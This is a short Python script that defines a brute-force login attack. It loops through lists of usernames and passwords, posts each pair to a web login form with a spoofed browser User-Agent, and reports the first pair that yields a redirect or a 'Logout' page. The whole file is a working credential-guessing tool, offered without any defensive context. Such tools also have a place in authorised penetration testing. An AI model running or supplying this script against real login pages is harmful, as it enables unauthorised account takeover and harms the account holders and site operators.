import requests

def brute_force_login(url, usernames, passwords):
    print("\n[+] Starting Brute-Force Attack...\n")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }

    for username in usernames:
        for password in passwords:

            data = {
                "username": username,
                "password": password
            }

            try:
                response = requests.post(
                    url,
                    data=data,
                    headers=headers,
                    allow_redirects=False,
                    timeout=5
                )

                print(f"[TESTING] {username}:{password} | Status: {response.status_code}")

                # Success condition (status-based + content-based)
                if response.status_code == 302 or "Logout" in response.text:
                    print("\n[HIGH] Valid credentials found!")
                    print(f"Username: {username}")
                    print(f"Password: {password}")
                    return

            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Request failed: {e}")

    print("\n[-] No valid credentials found.")
